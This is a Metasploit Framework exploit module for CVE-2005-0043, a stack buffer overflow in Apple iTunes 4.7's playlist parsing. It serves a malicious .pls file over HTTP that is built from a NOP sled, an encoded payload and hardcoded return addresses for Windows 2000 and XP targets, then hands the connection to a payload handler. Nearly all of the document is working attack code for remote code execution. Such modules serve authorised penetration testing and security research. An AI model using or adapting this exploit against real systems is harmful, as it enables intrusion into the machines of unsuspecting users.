##
# $Id: apple_itunes_playlist.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apple ITunes 4.7 Playlist Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Apple ITunes 4.7
				build 4.7.0.42. By creating a URL link to a malicious PLS
				file, a remote attacker could overflow a buffer and execute
				arbitrary code. When using this module, be sure to set the
				URIPATH with an extension of '.pls'.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 'MC',
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2005-0043' ],
					[ 'OSVDB', '12833' ],
					[ 'BID', '12238' ],
				],

			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},

			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 Pro English SP4',	{ 'Ret' => 0x75033083 } ],
					[ 'Windows XP Pro English SP2',		{ 'Ret' => 0x77dc2063 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jan 11 2005',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		cruft   = rand(9).to_s

		sploit =  make_nops(2545) + payload.encoded + [target.ret].pack('V')

		# Build the HTML content
		content =  "[playlist]\r\n" + "NumberOfEntries=#{cruft}\r\n"
		content << "File#{cruft}=http://#{sploit}"

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)
	end

end
